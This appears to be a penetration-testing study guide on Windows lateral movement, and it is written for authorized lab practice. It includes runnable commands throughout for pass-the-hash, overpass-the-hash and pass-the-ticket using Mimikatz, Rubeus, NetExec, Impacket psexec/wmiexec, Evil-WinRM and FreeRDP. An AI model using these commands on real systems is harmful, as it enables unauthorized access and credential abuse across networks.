Move to another host

Strategy map | Master Notes | Operational index | Cheatsheets

Select credential type → accepted authentication → reachable service → service authorization → execution effect. Hash/ticket use is an authentication dimension; SMB, tasks, WMI, WinRM and RDP are different access mechanisms.

Speedrun blocks: 12; consumes routes from 13. Documented methods: 9.

Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.

First pass: tools and findings

Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.

Test the destination from the real source

A working password on one service does not establish execution permission on another host.

nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET
getent hosts TARGET_HOST
  • If WinRM is reachable and the account has endpoint rights: Use the WinRM procedure and verify the resulting token. → Use WinRM, WinRS or PowerShell remoting.
  • If SMB/RPC is reachable and service-control rights are confirmed: Use the service-execution procedure with a separate output path. → Execute through uploaded service creation using PsExec.
  • Otherwise: Only the listener is reachable: inspect actual endpoint authorization before selecting an execution tool. → Select password, NT hash, key-to-ticket or ticket authentication.

Match password, hash, key or ticket to the client

Use the existing Impacket/NetExec protocol-specific examples; do not treat successful authentication as remote execution.

klist
getent hosts TARGET_HOST
date -u
  • If Accepted authentication plus remote service rights: Check share/SCM permissions and output reachability. → Execute through uploaded service creation using PsExec.
  • If WMI/task rights with RPC/DCOM connectivity: Check the exact namespace/task authorization and output channel. → Execute through WMI or native CIM over DCOM.
  • Otherwise: The artifact is rejected: recheck identity scope, material format, service name and transport. → Classify the artifact and its identity context.

Discovery workflow

Start with material tied to a known identity and a destination candidate; neither valid authentication nor remote execution rights are assumed.

Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.

  1. Check the destination from the actual source, including dynamic RPC and names: Match route, destination service and effective authorization.
  2. Classify password, NT hash, long-term key or service-scoped ticket: Select password, NT hash, key-to-ticket or ticket authentication.
  3. Match effective service/task/WMI authorization to its separate output path: Execute through uploaded service creation using PsExec; Execute commands through service command lines and SMB output; Execute through remote Task Scheduler; Execute through WMI or native CIM over DCOM.
  4. Check endpoint or remote-interactive rights for WinRM/RDP and verify the resulting token: Use WinRM, WinRS or PowerShell remoting; Obtain an authorized RDP interactive session.

PowerView examples require a reviewed compatible script in the current authenticated directory context. Check the loaded copy rather than mixing legacy/fork parameter names; the directory-mapping entry includes native, ADSI and LDAP alternatives.

Import-Module .\PowerView.ps1
Get-Command -Module PowerView

Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.

Method families

  • Route, authorization and authentication material: Match route, destination service and effective authorization, Select password, NT hash, key-to-ticket or ticket authentication.
  • Service and scheduled-task execution: Execute through uploaded service creation using PsExec, Execute commands through service command lines and SMB output, Execute through remote Task Scheduler.
  • Management protocol execution: Execute through WMI or native CIM over DCOM, Execute through an authorized DCOM application object, Use WinRM, WinRS or PowerShell remoting.
  • Interactive access: Obtain an authorized RDP interactive session.

2. Recognition clues

A credential appears valid but the destination's usable access is unknown.

Find the clue from your starting access

Where to investigate: Use the discovered destination name/address and known credential record, then inspect the selected service ports from the actual direct or established pivot source.

Starting access: Identified authentication material, destination service reachability and a candidate authorized identity. Required conditions: Real source-to-service route, correct identity context and protocol-specific execution/logon rights.

5. Why it works

SMB authentication, SCM/WMI rights, WinRM endpoint rights and RDP logon rights are different. Local-account remote filtering and second-hop delegation can change an otherwise valid credential's effect.

NetExec can classify a selected SMB credential:

# Domain password
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'

# Domain NT hash
nxc smb TARGET -d DOMAIN -u USER -H NT_HASH

# Target-local account
nxc smb TARGET -u Administrator -H NT_HASH --local-auth

# Prove only share access
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares

A successful login proves SMB authentication. (Pwn3d!) is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed.

For one justified execution proof:

nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec

Current NetExec can select wmiexec, atexec or smbexec; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable.

DOMAIN\USER  -> domain identity; evaluate target-local group/right
TARGET\USER  -> SAM identity on that target
./USER        -> tool-specific local-account selection

Common failure pattern:

  1. a local account authenticates over SMB;
  2. Windows issues a filtered remote token;
  3. ADMIN$, SCM or WMI administrative operations fail.

Do not “fix” this by changing LocalAccountTokenFilterPolicy during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity.

Remote process creation, stdout retrieval and an interactive shell are separate states:

AUTHENTICATED
-> REMOTE OPERATION AUTHORIZED
-> PROCESS/TASK/SERVICE CREATED
-> COMMAND EFFECT OCCURRED
-> OUTPUT RETURNED OR CALLBACK CONNECTED
-> USABLE SESSION
  • PsExec returns named-pipe I/O through its service.
  • WMIExec normally redirects output to an SMB share.
  • SMBExec redirects command output while repeatedly creating services.
  • ATExec writes output under ADMIN$\Temp.
  • Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect.
  • WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user.
  • WinRM creates a remote shell/runspace and returns structured or text output.

A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation.

hostname
whoami /all
ipconfig /all
route print
netstat -ano
klist

Re-enumerate:

  1. local privilege and accessible credential sources;
  2. domain groups, ACLs, shares and host rights under the new identity;
  3. logged-on sessions and service accounts;
  4. interfaces, routes, DNS, listeners and internal reachability;
  5. the next evidence-backed host/identity transition.

Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects.

7. Worked example — hypothetical

Observation: a credential authenticates to SMB but WMI fails. Test: check RPC endpoint/dynamic-port reachability and authorization. Illustrative output: TCP/445 works but negotiated RPC is blocked. Interpretation: choose a reachable authorized SMB method or repair the route.

8. Verify the result

Record exact source, credential type, destination name/service and successfully permitted operation.

9. Failure and fallback

Do not infer every service works from an administrative SMB indicator. Separate authentication, route, execution and output-channel failures.

3. Prerequisites

Starting access: Identified authentication material, destination service reachability and a candidate authorized identity. Required conditions: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization.

4. Discover and verify prerequisites

klist
getent hosts TARGET_HOST

5. Why it works

Pass-the-Hash uses NTLM key material; Overpass-the-Hash/key-to-ticket requests Kerberos credentials; Pass-the-Ticket uses an existing ticket. They do not grant the same services without their own rights and scope.

6. Execute and choose variants

Pass-the-Hash
NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE

PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization.

Overpass-the-Hash / key-to-ticket

Mimikatz network-credential context:

sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe

Rubeus TGT request:

Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
klist

AES alternative:

Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt

Trigger a Kerberos service request with the hostname, then inspect:

dir \\TARGET_HOST\C$
klist

In a Mimikatz sekurlsa::pth process, whoami can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local whoami as the network identity.

Pass-the-Ticket

Windows:

Rubeus.exe ptt /ticket:ticket.kirbi
klist

kerberos::ptt ticket.kirbi

Linux:

export KRB5CCNAME="$PWD/ticket.ccache"
klist
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'

A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect.

7. Worked example — hypothetical

Observation: an NT hash works for NTLM SMB but an RC4 TGT request fails. Test: inspect domain encryption policy and available key types. Illustrative output: RC4 is disabled. Interpretation: use an allowed existing service route or a supported AES/key/password transition.

8. Verify the result

Verify exact material type, represented network identity and successful destination action.

9. Failure and fallback

Wrong ticket service, RC4 policy, time skew, IP-only SPN naming or local/domain mismatch can invalidate one variant while another remains viable.

10. Next transitions

Execute through uploaded service creation using PsExec; Execute through WMI or native CIM over DCOM; Use WinRM, WinRS or PowerShell remoting; Inventory, convert and import tickets in the correct logon context.

3. Prerequisites

Starting access: Identified authentication material, destination service reachability and a candidate authorized identity. Required conditions: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context.

4. Discover and verify prerequisites

nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares

5. Why it works

PsExec creates a service and communicates through its service/pipes. Its service execution identity can differ from the authenticated account; the official Windows tool and Impacket implementation have distinct artifacts/options.

6. Execute and choose variants

# Password
impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'

# NT hash / Pass-the-Hash
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'

Need: SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM.

Kerberos cache:

export KRB5CCNAME="$PWD/USER.ccache"
impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'

The target parameter uses the hostname matching the CIFS/HOST SPN; -target-ip separates connection routing from Kerberos naming.

PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe

The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable.

7. Worked example — hypothetical

Observation: the identity can write the required administrative share and create services. Test: execute a minimal hostname/identity command. Illustrative output: the service channel returns SYSTEM on the intended host. Interpretation: verify token/network state and re-enumerate.

8. Verify the result

Verify destination and represented execution identity, not only service creation or tool success.

9. Failure and fallback

Share write, SCM access, service start, endpoint controls and pipe communication can fail independently.

5. Why it works

6. Execute and choose variants

impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET'

WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to ADMIN$; therefore a WMI process may run even when output retrieval fails. -nooutput or -silentcommand changes that evidence channel.

Kerberos with separate name and route:

export KRB5CCNAME="$PWD/USER.ccache"
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
One command, no SMB output 
impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt"

Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.

$Credential = Get-Credential 'DOMAIN\USER'
$Options = New-CimSessionOption -Protocol Dcom
$Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
  CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt'
}

Remove-CimSession $Session

ReturnValue = 0 and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop.

5. Why it works

WinRM authentication is separate from endpoint authorization and delegated second-hop credentials. Evil-WinRM, WinRS and native remoting expose related services with different client features.

6. Execute and choose variants

Evil-WinRM
# Password; omit -p to prompt where supported
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'

# NT hash
evil-winrm -i TARGET_HOST -u USER -H NT_HASH

# HTTPS listener
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986

Current Evil-WinRM ticket-file support:

evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP

Need: reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket.

Native WinRS
winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami"

To avoid retaining a password on the command line, use the current authorized Windows credential context where possible:

winrs /r:TARGET_HOST "cmd /c hostname & whoami"

WinRS uses WinRM. A non-administrator can require /noprofile depending on endpoint configuration. /allowdelegate affects onward credential use and is not a default fix for the double-hop problem.

PowerShell remoting
Test-WSMan TARGET_HOST
$Credential = Get-Credential 'DOMAIN\USER'

Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock {
  hostname
  whoami /all
}

$Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential
Enter-PSSession -Session $Session

A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes.

3. Prerequisites

Starting access: Identified authentication material, destination service reachability and a candidate authorized identity. Required conditions: Allowed account/session policy and compatible client/NLA/TLS; hash-based Restricted Admin has additional supported-policy/admin requirements.

4. Discover and verify prerequisites

Test-NetConnection TARGET -Port 3389

5. Why it works

RDP is an access method, not automatic local elevation. Restricted Admin/hash use and ordinary password logon have different requirements and network credential behavior.

6. Execute and choose variants

Check the installed binary name:

command -v xfreerdp3 || command -v xfreerdp

Password:

xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard

Older packages may expose the same syntax through xfreerdp.

NT hash:

xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution

FreeRDP's /pth uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override.

Native client:

mstsc.exe /v:TARGET_HOST
mstsc.exe /restrictedAdmin /v:TARGET_HOST

Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately.

Purpose: use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position.

Baseline: prompt for the password
xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore

Some Kali releases expose xfreerdp instead of xfreerdp3; check command -v xfreerdp3 xfreerdp and the selected binary's /help output.

Decisive output: a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify whoami, hostname and ipconfig before treating commands as target-origin execution.

Variant — domain identity 
xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore

Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ.

Variant — authentication only 
xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore

This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session.

Variant — explicit password 
xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore

Prefer prompting because command-line passwords can enter shell history and process listings.

Failure cues: a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. /cert:ignore is appropriate only for the controlled lab context because it removes certificate identity validation.

Next: after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position.

7. Worked example — hypothetical

Observation: a domain user is in the destination's RDP access group. Test: perform a correctly qualified login. Illustrative output: a desktop opens under a non-admin token. Interpretation: establish host/token state and inspect the new access context.

8. Verify the result

Verify destination, user/token and permitted desktop actions; keep credentials out of reusable screenshots/notes.

9. Failure and fallback

A valid password can still lack logon rights. NLA, TLS, domain qualification and Restricted Admin policy are separate conditions.
